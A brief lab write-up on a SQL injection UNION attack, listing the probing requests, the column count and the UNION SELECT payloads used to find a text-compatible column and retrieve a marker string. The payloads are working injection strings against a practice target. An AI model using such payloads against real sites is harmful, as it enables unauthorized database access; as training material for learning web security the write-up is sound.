# Lab: SQL injection UNION attack, finding a column containing text

Target : dentify a column that is compatible with string data.
         Make the database retrieve the string: 'jhpQzd'

Analysis :

- `/product?productId=4'"` -> 400 bad request
- `/filter?category=Accessories'"` -> 500 internal error

- number of columns is 3
- `Accessories'+UNION+SELECT+NULL,+'A',+NULL--` -> The second column could be used To retrive string values from the database
- so to solve the we simply could `/filter?category=Accessories'+UNION+SELECT+NULL,+'jhpQzd',+NULL--`
